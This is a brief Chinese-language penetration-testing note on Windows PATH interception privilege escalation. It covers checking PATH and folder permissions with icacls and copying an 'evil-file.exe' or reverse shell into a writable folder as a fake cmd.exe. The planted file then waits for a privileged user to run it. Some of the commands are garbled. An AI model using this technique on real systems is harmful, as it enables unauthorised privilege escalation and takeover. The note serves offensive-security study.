# $PATH 拦截

先决条件：

• PATH 包含一个低权限的可写文件夹。

• 可写文件夹位于包含合法二进制文件的文件夹*之前。*

```bash
**通过powerup可以发现和利用 PATH 环境变量中的路径拦截机会**
$env:Path  //查看路径
#查看目标文件夹的权限
#示例输出：BUILTIN\Users: GR,GW 
icacls .exe  " C:\Program Files\nodejs\ " 

#将我们的 evil-file 放在那个文件夹中。
复制evil-file.exe  " C:\Program Files\nodejs\cmd.exe "
```

## 案例：(此案例是将cacl程序换成cmd.exe)

**若发现一个C:\temp 在 c:\windows\system32 之前。**

![https://i.imgur.com/IDAghec.png](https://i.imgur.com/IDAghec.png)

并且查到这个路径是可以通过普通用户（**BUILTIN\Users）**可写（**RX**）的

![https://i.imgur.com/6AW9R5o.png](https://i.imgur.com/6AW9R5o.png)

利用方式：将反向shell放入C:\temp文件夹，并将其命名为cmd.exe

![https://i.imgur.com/mt3htEV.png](https://i.imgur.com/mt3htEV.png)

等待高权限用户调用cmd.exe，则被触发C:\temp\**fake-cmd.exe**

![Untitled]($PATH%20%E6%8B%A6%E6%88%AA%2062db344a5f9648cab07ce8c9f3f5f2b3/Untitled.png)